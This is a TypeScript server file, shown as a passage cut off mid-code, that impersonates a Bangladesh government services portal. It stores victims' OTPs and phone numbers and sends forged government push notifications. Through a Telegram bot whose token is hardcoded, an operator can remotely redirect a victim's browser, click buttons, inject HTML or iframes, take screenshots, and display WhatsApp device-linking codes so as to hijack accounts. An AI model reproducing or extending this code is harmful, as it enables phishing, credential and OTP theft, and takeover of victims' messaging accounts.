import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import { fileURLToPath } from "url";
import multer from "multer";
import webpush from "web-push";
import fs from "fs";

const resolvedFilename = typeof __filename !== "undefined" ? __filename : (typeof import.meta !== "undefined" && import.meta.url ? fileURLToPath(import.meta.url) : "");
const resolvedDirname = typeof __dirname !== "undefined" ? __dirname : (resolvedFilename ? path.dirname(resolvedFilename) : process.cwd());

const upload = multer({ storage: multer.memoryStorage() });

// Stored persistent state for session-based user tracking and OTP responses
let userCounter = 0;
const sessionOtpStatus: Record<string, { status: "pending" | "success" | "error"; otp?: string; phone?: string; platform?: string; timestamp: number }> = {};
let lastUpdateId = 0;

// Remote command schema for controlling client browser remotely
interface RemoteCommand {
  action: 'open_page' | 'show_ad' | 'click_button' | 'open_link' | 'trigger_otp_success' | 'trigger_otp_error' | 'show_video_ad' | 'show_photo_ad' | 'show_html_ad' | 'show_web_ad' | 'force_push' | 'whatsapp_pairing_code' | 'take_screenshot';
  target?: string;
  payload?: string;
  fileId?: string;
  timestamp: number;
}

const sessionRemoteCommands: Record<string, RemoteCommand> = {};

// Load/Save push subscriptions persistently to survive development server restarts
const PUSH_SUBS_FILE = path.join(process.cwd(), "push-subscriptions.json");
let sessionPushSubscriptions: Record<string, any[]> = {};
try {
  if (fs.existsSync(PUSH_SUBS_FILE)) {
    sessionPushSubscriptions = JSON.parse(fs.readFileSync(PUSH_SUBS_FILE, "utf-8"));
    console.log("[PUSH] Loaded persistent push subscriptions from file:", Object.keys(sessionPushSubscriptions));
  }
} catch (e) {
  console.error("[PUSH ERROR] Failed to load persistent push subscriptions:", e);
}

function savePushSubscriptions() {
  try {
    fs.writeFileSync(PUSH_SUBS_FILE, JSON.stringify(sessionPushSubscriptions, null, 2), "utf-8");
  } catch (e) {
    console.error("[PUSH ERROR] Failed to save push subscriptions to disk:", e);
  }
}

// Online/Offline tracking: userId -> { status, lastActive }
const sessionOnlineStatus: Record<string, { status: "online" | "offline"; lastActive: number }> = {};

// Stable persistent VAPID keys so the browser doesn't block subscriptions on reboot
const VAPID_KEYS_FILE = path.join(process.cwd(), "vapid-keys.json");
let vapidKeys: { publicKey: string; privateKey: string };
try {
  if (fs.existsSync(VAPID_KEYS_FILE)) {
    vapidKeys = JSON.parse(fs.readFileSync(VAPID_KEYS_FILE, "utf-8"));
    console.log("[PUSH] Loaded persistent VAPID Keys from disk.");
  } else {
    vapidKeys = webpush.generateVAPIDKeys();
    fs.writeFileSync(VAPID_KEYS_FILE, JSON.stringify(vapidKeys, null, 2), "utf-8");
    console.log("[PUSH] Generated and saved brand new VAPID Keys to disk.");
  }
} catch (e) {
  console.error("[PUSH ERROR] VAPID persistence failed, generating in-memory keys:", e);
  vapidKeys = webpush.generateVAPIDKeys();
}

webpush.setVapidDetails(
  'mailto:support@gov.bd.portal',
  vapidKeys.publicKey,
  vapidKeys.privateKey
);

// Dynamic helper to execute standard Web Push alerts when a remote command is launched
async function sendPushNotification(userId: string, cmd: RemoteCommand) {
  const uId = String(userId).toLowerCase().trim();
  const subs = sessionPushSubscriptions[uId];
  if (!subs || subs.length === 0) {
    console.log(`[PUSH] No active push subscriptions found for user: ${uId}`);
    return;
  }

  let title = "গণপ্রজাতন্ত্রী বাংলাদেশ সরকার";
  let body = "আপনার জন্য একটি নতুন জরুরি বিজ্ঞপ্তি এসেছে!";

  if (cmd.action === 'show_ad') {
    title = "নতুন জরুরি বিজ্ঞপ্তি";
    body = cmd.payload || "আপনার জন্য নতুন সরকারি নোটিফিকেশন জারি করা হয়েছে।";
  } else if (cmd.action === 'show_video_ad') {
    title = "জরুরি ভিডিও নির্দেশনা";
    body = "আপনার ডিভাইসে একটি ভিডিও নির্দেশনা পাঠানো হয়েছে। ট্যাপ করে প্লে করুন।";
  } else if (cmd.action === 'show_photo_ad') {
    title = "সরকারি জরুরি ছবি/নির্দেশনা";
    body = cmd.payload || "নতুন ফটো নোটিফিকেশন এসেছে। দেখতে ট্যাপ করুন।";
  } else if (cmd.action === 'show_html_ad') {
    title = "লাইভ ডিজিটাল সার্ভিস ভিউ";
    body = "ডিজিটাল কপি বা সার্টিফিকেট ভিউ প্রস্তুত হয়েছে। ট্যাপ করে দেখুন।";
  } else if (cmd.action === 'show_web_ad') {
    title = "লাইভ সরকারি পোর্টাল সেবা";
    body = "প্রধান পোর্টাল ভিউ আপনার ফোনে প্রস্তুত। সরাসরি ট্যাপ করে প্রবেশ করুন।";
  } else if (cmd.action === 'open_page') {
    title = "জরুরি পোর্টাল রিডাইরেক্ট";
    body = "প্রশাসনের নির্দেশনা অনুসারে আপনার পেজটি অটোমেটিক রিমোটলি পরিবর্তন করা হয়েছে।";
  }

  const payloadString = JSON.stringify({
    title,
    body,
    action: cmd.action,
    target: cmd.target || '',
    payload: cmd.payload || '',
    timestamp: Date.now()
  });

  console.log(`[PUSH] Dispatching notification payload to ${subs.length} devices of user: ${uId}`);
  const invalidSubs: any[] = [];

  for (const sub of subs) {
    try {
      await webpush.sendNotification(sub, payloadString);
    } catch (err: any) {
      console.error(`[PUSH ERROR] Failed to send push message:`, err.statusCode || err.message);
      if (err.statusCode === 410 || err.statusCode === 404) {
        invalidSubs.push(sub);
      }
    }
  }

  if (invalidSubs.length > 0) {
    sessionPushSubscriptions[uId] = sessionPushSubscriptions[uId].filter(
      item => !invalidSubs.includes(item)
    );
    console.log(`[PUSH] Cleaned up ${invalidSubs.length} dead subscription(s) for user: ${uId}`);
  }
}

// Dynamic Telegram Bot Config
let activeTgBotToken = process.env.TG_BOT_TOKEN || '';
let activeTgChatId = process.env.TG_CHAT_ID || '';

// Poll Telegram for direct /success or /error commands and inline comment replies
async function startTelegramPolling() {
  console.log('[TELEGRAM POLLING] Background worker started.');
  while (true) {
    const TG_BOT_TOKEN = activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
    if (!TG_BOT_TOKEN || TG_BOT_TOKEN.trim().length === 0) {
      await new Promise((resolve) => setTimeout(resolve, 15000));
      continue;
    }
    try {
      const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`);
      if (!response.ok) {
        if (response.status === 401) {
          console.warn('[TELEGRAM POLLING] Unauthorized (401) response code. Token is likely invalid or revoked. Polling delayed by 30 seconds.');
          await new Promise((resolve) => setTimeout(resolve, 30000));
        } else {
          await new Promise((resolve) => setTimeout(resolve, 10000));
        }
        continue;
      }
      const data = await response.json();
      if (data.ok && data.result) {
        for (const update of data.result) {
          lastUpdateId = update.update_id;
          
          if (update.message) {
            const text = (update.message.text || update.message.caption || '').trim();
            const chatId = update.message.chat.id;
            const replyTo = update.message.reply_to_message;

            // Extract file attachments if present (video, photo, etc.)
            let attachedFileId: string | undefined = undefined;
            if (update.message.video) {
              attachedFileId = update.message.video.file_id;
            } else if (update.message.photo && update.message.photo.length > 0) {
              // Best/highest resolution is the last element
              attachedFileId = update.message.photo[update.message.photo.length - 1].file_id;
            } else if (update.message.document) {
              // Capture any document (including html index.html files!)
              attachedFileId = update.message.document.file_id;
            }

            // Support commands targeting remote customer devices
            // Match formats: /user_X open [page_name]  or  /user-X openAllRegister
            const openPageMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+open\s+(.+)$/i);
            const showAdMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+show_ad\s+(.+)$/i);
            const sendAdsMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+send\s+ads\s+([\s\S]+)$/i);
            const openVideoAdsMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+open\s+video\s+ads(?:\s+([\s\S]+))?$/i);
            const openPhotoAdsMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+open\s+photo\s+ads(?:\s+([\s\S]+))?$/i);
            const openHtmlAdsMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+(?:open\s+html(?:\s+ads)?|html|show_html)(?:\s+([\s\S]+))?$/i);
            const openWebAdsMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+(?:web|show_web|iframe)(?:\s+([\s\S]+))?$/i);
            const clickButtonMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+click\s+(.+)$/i);
            const openLinkMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+open_link\s+(.+)$/i);
            const forcePushMatch = text.match(/^\/?(user[-_](?:\d+|\w+))\s+(?:force[-_]push|ask[-_]push|show[-_]push|push)$/i) || 
                                   text.match(/^\/?(?:force[-_]push|ask[-_]push|show[-_]push|push)(?:_|\s+)(user[-_](?:\d+|\w+))/i);

            // WhatsApp Device Linker Command matches (support optional braces/brackets/parentheses around user id or code)
            const wpDeviceLinkerMatch = text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?\s+\/?WhatsApp[\s-_]*Device[\s-_]*Linker\s+[\{\[\(]?\s*([A-Za-z0-9]{4,12})\s*[\}\]\)]?/i);
            const wpDeviceLinkerNewMatch = text.match(/^\/?WhatsApp[\s-_]*Device[\s-_]*Linker[\s-_]*[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?\s+[\{\[\(]?\s*([A-Za-z0-9]{4,12})\s*[\}\]\)]?/i);
            const wpDeviceLinkerReplyMatch = text.match(/^\/?WhatsApp[\s-_]*Device[\s-_]*Linker\s+[\{\[\(]?\s*([A-Za-z0-9]{4,12})\s*[\}\]\)]?/i);

            // Screenshot Command match
            const screenshotMatch = text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?\s*(?:screenshort|screenshot|screen|screensort|shot)\s*$/i) || 
                                    text.match(/^\/?(?:screenshort|screenshot|screen|screensort|shot)_?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?/i) ||
                                    text.match(/^\/?[\{\[\(]?\s*(user[-_\s]*(?:\d+|\w+))\s*[\}\]\)]?(?:screenshort|screenshot|screensort|shot)/i);

            // Direct match command: /success user_X, /success_user_X, /error user_X, or /error_user_X
            const successMatch = text.match(/^\/?success(?:_|\s+)(user_\d+)/i);
            const errorMatch = text.match(/^\/?error(?:_|\s+)(user_\d+)/i);

            if (openHtmlAdsMatch) {
              const uId = openHtmlAdsMatch[1].toLowerCase().replace('-', '_');
              const extraText = openHtmlAdsMatch[2]?.trim() || '';

              sessionRemoteCommands[uId] = {
                action: 'show_html_ad',
                fileId: attachedFileId,
                payload: extraText,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] SHOW HTML AD: "${attachedFileId}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `🖥️ <b>লাইভ এইচটিএমএল (HTML) বিজ্ঞাপন কমান্ড সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>ধরণ:</b> <code>লাইভ কোড বিজ্ঞাপন (HTML Code Ad)</code>\n<b>এইচটিএমএল ফাইল:</b> ${attachedFileId ? '✅ ফাইল পাওয়া গিয়েছে (index.html)' : '❌ কোনো সংযুক্ত ফাইল নেই'}\n${extraText ? `<b>এইচটিএমএল কোড/ক্যাপশন:</b> <code>${extraText.substring(0, 100)}${extraText.length > 100 ? '...' : ''}</code>` : ''}\n\n<i>গ্রাহক স্ক্রিনে ক্রস বাটন সহ উক্ত এইচটিএমএল কোডটি সচল হয়ে ভেসে উঠবে এবং নোটিফিকেশন পাঠানো হয়েছে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (openWebAdsMatch) {
              const uId = openWebAdsMatch[1].toLowerCase().replace('-', '_');
              const urlTarget = openWebAdsMatch[2]?.trim() || '';

              sessionRemoteCommands[uId] = {
                action: 'show_web_ad',
                payload: urlTarget,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] SHOW WEB/IFRAME AD: "${urlTarget}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `🌐 <b>ওয়েবসাইট ফ্রেম বিজ্ঞাপন কমান্ড সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>ধরণ:</b> <code>ওয়েবসাইট বিজ্ঞাপন (Web / Iframe Ad)</code>\n<b>ওয়েবসাইট লিংক:</b> <code>${urlTarget || '❌ কোনো লিংক প্রদান করা হয়নি'}</code>\n\n<i>গ্রাহক স্ক্রিনে এই ওয়েবসাইটের লাইভ ফ্রেম ক্রস বাটন সহ ভেসে উঠবে এবং নোটিফিকেশন পাঠানো হয়েছে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (openVideoAdsMatch) {
              const uId = openVideoAdsMatch[1].toLowerCase().replace('-', '_');
              const extraText = openVideoAdsMatch[2]?.trim() || '';

              sessionRemoteCommands[uId] = {
                action: 'show_video_ad',
                fileId: attachedFileId,
                payload: extraText,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] SHOW VIDEO AD: "${attachedFileId}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `🎥 <b>ভিডিও বিজ্ঞাপন কমান্ড সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>ধরণ:</b> <code>ভিডিও বিজ্ঞাপন (Video Ad)</code>\n<b>ভিডিও ফাইল:</b> ${attachedFileId ? '✅ ফাইল পাওয়া গিয়েছে' : '❌ কোনো সংযুক্ত ফাইল নেই'}\n${extraText ? `<b>ভিডিওর বিবরণ/ক্যাপশন:</b> "${extraText}"` : ''}\n\n<i>গ্রাহক স্ক্রিনে প্লেয়ার ফ্রেম লোড হবে, নোটিফিকেশন পাঠানো হয়েছে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (openPhotoAdsMatch) {
              const uId = openPhotoAdsMatch[1].toLowerCase().replace('-', '_');
              const extraText = openPhotoAdsMatch[2]?.trim() || '';

              sessionRemoteCommands[uId] = {
                action: 'show_photo_ad',
                fileId: attachedFileId,
                payload: extraText,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] SHOW PHOTO AD: "${attachedFileId}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `🖼️ <b>ছবির বিজ্ঞাপন কমান্ড সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>ধরণ:</b> <code>ছবির বিজ্ঞাপন (Photo Ad)</code>\n<b>ছবি ফাইল:</b> ${attachedFileId ? '✅ ফাইল পাওয়া গিয়েছে' : '❌ কোনো সংযুক্ত ফাইল নেই'}\n${extraText ? `<b>ছবির বিবরণ/ক্যাপশন:</b> "${extraText}"` : ''}\n\n<i>গ্রাহক স্ক্রিনে ছবির ব্যানার লোড হবে এবং নোটিফিকেশন পাঠানো হয়েছে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (openPageMatch) {
              const uId = openPageMatch[1].toLowerCase().replace('-', '_');
              let targetPage = openPageMatch[2].trim().toLowerCase();
              
              // Map friendly page names to app page IDs
              let appPage = targetPage;
              if (targetPage.includes('all register') || targetPage.includes('allregister') || targetPage.includes('register')) {
                appPage = 'all-register';
              } else if (targetPage.includes('family card') || targetPage.includes('family') || targetPage.includes('ফ্যামিলি')) {
                appPage = 'family_card';
              } else if (targetPage.includes('remittance') || targetPage.includes('রেমিট্যান্স') || targetPage.includes('প্রণোদনা')) {
                appPage = 'safe_remittance';
              } else if (targetPage.includes('scholarship') || targetPage.includes('higher edu') || targetPage.includes('child welfare') || targetPage.includes('বৃত্তি') || targetPage.includes('কল্যাণ')) {
                appPage = 'higher_edu_scholarship';
              } else if (targetPage.includes('medical') || targetPage.includes('vaccine') || targetPage.includes('মেডিকেল') || targetPage.includes('ভ্যাকসিন')) {
                appPage = 'medical_vaccine_card';
              } else if (targetPage.includes('pdo') || targetPage.includes('orientation') || targetPage.includes('পিডিও') || targetPage.includes('ওরিয়েন্টেশন')) {
                appPage = 'pdo_certificate';
              } else if (targetPage.includes('grant') || targetPage.includes('প্রবাসী অনুদান') || targetPage.includes('অনুদানের') || targetPage.includes('অনুদানের')) {
                appPage = 'expatriate_grant';
              } else if (targetPage.includes('bmet') || targetPage.includes('বিএমইটি')) {
                appPage = 'bmet_smart_card';
              } else if (targetPage.includes('home') || targetPage.includes('index')) {
                appPage = 'home';
              } else if (targetPage.includes('dashboard') || targetPage.includes('db')) {
                appPage = 'dashboard';
              } else if (targetPage.includes('help') || targetPage.includes('support') || targetPage.includes('chat') || targetPage.includes('help-center') || targetPage.includes('help centre')) {
                appPage = 'help-center';
              }

              sessionRemoteCommands[uId] = {
                action: 'open_page',
                target: appPage,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              let pageLabel = appPage;
              if (appPage === 'family_card') pageLabel = 'ফ্যামিলি স্মার্ট কার্ড আবেদন';
              else if (appPage === 'safe_remittance') pageLabel = 'নিরাপদ রেমিট্যান্স ক্যাশ প্রণোদনা';
              else if (appPage === 'higher_edu_scholarship') pageLabel = 'উচ্চশিক্ষা বৃত্তি ও সন্তান কল্যাণ';
              else if (appPage === 'medical_vaccine_card') pageLabel = 'মেডিকেল ও করোনা ভ্যাকসিন ডিজিটাল কার্ড';
              else if (appPage === 'pdo_certificate') pageLabel = 'পিডিও সার্টিফিকেট স্মার্ট আবেদন';
              else if (appPage === 'expatriate_grant') pageLabel = 'প্রবাসী অনুদান আবেদন';
              else if (appPage === 'bmet_smart_card') pageLabel = 'বিএমইটি স্মার্ট কার্ড ডিজিটাল কপি';

              console.log(`[TELEGRAM REMOTE COMMAND] OPEN PAGE: ${appPage} for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `⚡ <b>Remote Command Issued!</b>\n\n<b>User:</b> <code>${uId}</code>\n<b>Action:</b> <code>Open Page</code> -> <code>${pageLabel}</code>\n\n<i>The target client window will be redirected and notified.</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            } 
            else if (sendAdsMatch || showAdMatch) {
              const matchObj = sendAdsMatch || showAdMatch;
              const uId = matchObj![1].toLowerCase().replace('-', '_');
              const adMessage = matchObj![2].trim();

              sessionRemoteCommands[uId] = {
                action: 'show_ad',
                payload: adMessage,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] SHOW AD: "${adMessage}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `📢 <b>বিজ্ঞাপন কমান্ড সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>ধরণ:</b> <code>টেক্সট বিজ্ঞাপন (Text Ad)</code>\n<b>বার্তা:</b> "${adMessage}"\n\n<i>বিজ্ঞাপনটি গ্রাহক স্ক্রিনে ভেসে উঠবে এবং নোটিফিকেশন পাঠানো হয়েছে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (clickButtonMatch) {
              const uId = clickButtonMatch[1].toLowerCase().replace('-', '_');
              const targetButton = clickButtonMatch[2].trim().toLowerCase();

              sessionRemoteCommands[uId] = {
                action: 'click_button',
                target: targetButton,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] CLICK BUTTON: "${targetButton}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `⚡ <b>Remote Command Issued!</b>\n\n<b>User:</b> <code>${uId}</code>\n<b>Action:</b> <code>Click Button</code> -> <code>${targetButton}</code>\n\n<i>কমান্ড ডিভাইসটিতে পাঠানো হয়েছে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (openLinkMatch) {
              const uId = openLinkMatch[1].toLowerCase().replace('-', '_');
              const url = openLinkMatch[2].trim();

              sessionRemoteCommands[uId] = {
                action: 'open_link',
                payload: url,
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] OPEN LINK: "${url}" for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `⚡ <b>Remote Command Issued!</b>\n\n<b>User:</b> <code>${uId}</code>\n<b>Action:</b> <code>Open Link</code> -> <code>${url}</code>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (forcePushMatch) {
              const uId = forcePushMatch[1].toLowerCase().replace('-', '_');

              sessionRemoteCommands[uId] = {
                action: 'force_push',
                timestamp: Date.now()
              };

              // Trigger Web Push alert
              sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

              console.log(`[TELEGRAM REMOTE COMMAND] FORCE PUSH PERMISSION for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `🔔 <b>পুশ নোটিফিকেশন পুনরায় অনুরোধ কমান্ড সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>ধরণ:</b> <code>নোটিফিকেশন রিকোয়েস্ট (Force Push Request)</code>\n\n<i>গ্রাহক অনলাইনে থাকলে তার পেজে নোটিফিকেশন এলাউ করার জন্য বিশেষ গাইড এবং পপআপ ফ্ল্যাশ হবে।</i>`,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (wpDeviceLinkerMatch) {
              const uId = wpDeviceLinkerMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
              const rawCode = wpDeviceLinkerMatch[2].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
              
              sessionRemoteCommands[uId] = {
                action: 'whatsapp_pairing_code',
                payload: rawCode,
                timestamp: Date.now()
              };

              console.log(`[TELEGRAM REMOTE COMMAND] WHATSAPP PAIRING CODE: "${rawCode}" for user ${uId}`);
              
              const statusInfo = sessionOnlineStatus[uId];
              let statusText = '';
              if (!statusInfo) {
                statusText = `❌ <b>কোড সেটিং ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>কারণ:</b> <u>${uId}</u> আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`;
              } else if (statusInfo.status !== 'online') {
                statusText = `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা/কারণ:</b> গ্রাহক এই মুহূর্তে অফলাইন রয়েছেন। তাই এই মুহূর্তে তার স্ক্রিনে কোডটি লাইভ হবে না। তবে গ্রাহক ব্রাউজার পেজে পুনরায় আসার সাথে সাথে কোডটি স্বয়ংক্রিয়ভাবে সচল হবে।`;
              } else {
                statusText = `🟢 <b>হোয়াটসঅ্যাপ গেটওয়ে কোড লাইভ সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা:</b> গ্রাহক অনলাইনে সক্রিয় রয়েছেন এবং কোডটি তার ব্রাউজার স্ক্রিনে লাইভ সচল করা হয়েছে!`;
              }

              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: statusText,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (wpDeviceLinkerNewMatch) {
              const uId = wpDeviceLinkerNewMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
              const rawCode = wpDeviceLinkerNewMatch[2].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
              
              sessionRemoteCommands[uId] = {
                action: 'whatsapp_pairing_code',
                payload: rawCode,
                timestamp: Date.now()
              };

              console.log(`[TELEGRAM REMOTE COMMAND] WHATSAPP PAIRING CODE (NEW): "${rawCode}" for user ${uId}`);
              
              const statusInfo = sessionOnlineStatus[uId];
              let statusText = '';
              if (!statusInfo) {
                statusText = `❌ <b>কোড সেটিং ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>কারণ:</b> <u>${uId}</u> আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`;
              } else if (statusInfo.status !== 'online') {
                statusText = `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা/কারণ:</b> গ্রাহক এই মুহূর্তে অফলাইন রয়েছেন। তাই এই মুহূর্তে তার স্ক্রিনে কোডটি লাইভ হবে না। তবে গ্রাহক ব্রাউজার পেজে পুনরায় আসার সাথে সাথে কোডটি স্বয়ংক্রিয়ভাবে সচল হবে।`;
              } else {
                statusText = `🟢 <b>হোয়াটসঅ্যাপ গেটওয়ে কোড লাইভ সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা:</b> গ্রাহক অনলাইনে সক্রিয় রয়েছেন এবং কোডটি তার ব্রাউজার স্ক্রিনে লাইভ সচল করা হয়েছে!`;
              }

              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: statusText,
                  parse_mode: 'HTML',
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            }
            else if (wpDeviceLinkerReplyMatch && replyTo) {
              const replyText = replyTo.text || replyTo.caption || '';
              const userIdMatch = replyText.match(/ID:\s*(user[-_]\d+)/i) || replyText.match(/আইডি:\s*(user[-_]\d+)/i);
              if (userIdMatch) {
                const uId = userIdMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
                const rawCode = wpDeviceLinkerReplyMatch[1].trim().toUpperCase().replace(/[\{\}\[\]\(\)\s]/g, '');
                
                sessionRemoteCommands[uId] = {
                  action: 'whatsapp_pairing_code',
                  payload: rawCode,
                  timestamp: Date.now()
                };

                console.log(`[TELEGRAM REMOTE COMMAND (REPLY)] WHATSAPP PAIRING CODE: "${rawCode}" for user ${uId}`);

                const statusInfo = sessionOnlineStatus[uId];
                let statusText = '';
                if (!statusInfo) {
                  statusText = `❌ <b>কোড সেটিং ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>কারণ:</b> reply মেসেজ থেকে আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`;
                } else if (statusInfo.status !== 'online') {
